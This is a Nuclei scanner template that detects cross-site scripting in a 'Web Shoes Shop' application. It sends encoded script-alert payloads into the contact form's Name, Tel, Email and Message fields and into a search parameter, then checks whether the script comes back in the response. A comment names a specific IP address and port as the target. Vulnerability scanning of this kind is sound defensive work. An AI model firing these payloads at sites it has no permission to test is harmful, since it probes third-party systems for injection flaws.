id: XSS-Web-Shoes-Shop
# nuclei -u http://103.90.225.135:8001 -t XSS-Web-Shoes-Shop.yaml

info:
  name: XSS in Web Shoes Shop
  author: Hung, Dat, Hoa, Danh
  severity: medium
  description: Detect XSS in Shoes Shop

requests:
  - raw:
      - |
        POST /contact HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        Origin: {{BaseURL}}
        Referer: {{BaseURL}}/contact
        Upgrade-Insecure-Requests: 1
        
        Name=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&Tel=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&Email=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&Message=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

      - |
        GET /search?name=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
        Host: {{Hostname}}
        
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - "<script>alert(document.domain)</script>"

      - type: word
        part: header
        words:
          - "text/html"
